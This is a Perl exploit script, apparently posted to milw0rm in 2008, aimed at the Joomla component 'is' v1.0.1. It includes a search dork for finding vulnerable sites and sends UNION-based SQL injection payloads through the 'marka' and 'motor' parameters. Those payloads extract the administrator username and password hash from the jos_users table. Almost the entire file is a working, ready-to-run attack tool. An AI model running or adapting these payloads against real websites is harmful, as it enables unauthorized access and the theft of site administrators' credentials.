#!/usr/bin/perl -w

#   Joomla Component is  v 1.0.1  Multiple Remote SQL Injection
#  variables vuln : ( marka )  & ( motor ) 
########################################
#[*] Found by : Houssamix From H-T Team 
#[*] H-T Team [ HouSSaMix + ToXiC350 ] 
#[*] Greetz : Mr.Al3FrItE & Islamic Security Team  & Mounita20 & CoNaN and all musulmans hackers

#[*] Component_Name:  is
#[*] Script_Name: Joomla
#[*] Dork : index.php?option=com_is
########################################
# <name>is</name>
# <creationDate>09.05.2006</creationDate>
# <author>MAXX MARKETING</author>
# <copyright>by 2006 Maxx Marketing</copyright>
# <authorEmail>klaus.huber@maxx-marketing.net</authorEmail>
# <authorUrl>www.maxx-marketing.net</authorUrl>
# <version>1.0.1</version> 


system("color f");
print "\t\t########################################################\n\n";
print "\t\t#                        Viva Islam                    #\n\n";
print "\t\t########################################################\n\n";
print "\t\t# Joomla Component Is v 1.0.1 multiple SQL Injection   #\n\n";
print "\t\t#       H-T Team [HouSSaMiX - ToXiC350]	              #\n\n";
print "\t\t########################################################\n\n";

use LWP::UserAgent;

print "\nEnter your Target (http://site.com/joomla/): ";
	chomp(my $target=<STDIN>);

$uname="username";
$magic="jos_users";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $target . "index.php?option=com_is&task=model&marka=-1%20union%20select%201,2,concat(CHAR(60,117,115,101,114,62),".$uname.",CHAR(60,117,115,101,114,62)),4,5,6,7,8,9,10,11,12,13 from/**/".$magic."/**";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;

print "\n[+] The Target : ".$target."";

if ($answer =~ /<user>(.*?)<user>/){
       
		print "\n[+] Admin User : $1";
}
$host2 = $target . "index.php?option=com_is&task=motor&motor=-1%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13/**/from/**/jos_users--";
$res2 = $b->request(HTTP::Request->new(GET=>$host2));
$answer = $res2->content;
if ($answer =~/([0-9a-fA-F]{32})/){
		print "\n[+] Admin Hash : $1\n\n";
		print "#   Exploit succeed!  #\n\n";
}
else{print "\n[-] Exploit Failed...\n";
}

# codec  by Houssamix From H-T Team

# milw0rm.com [2008-07-02]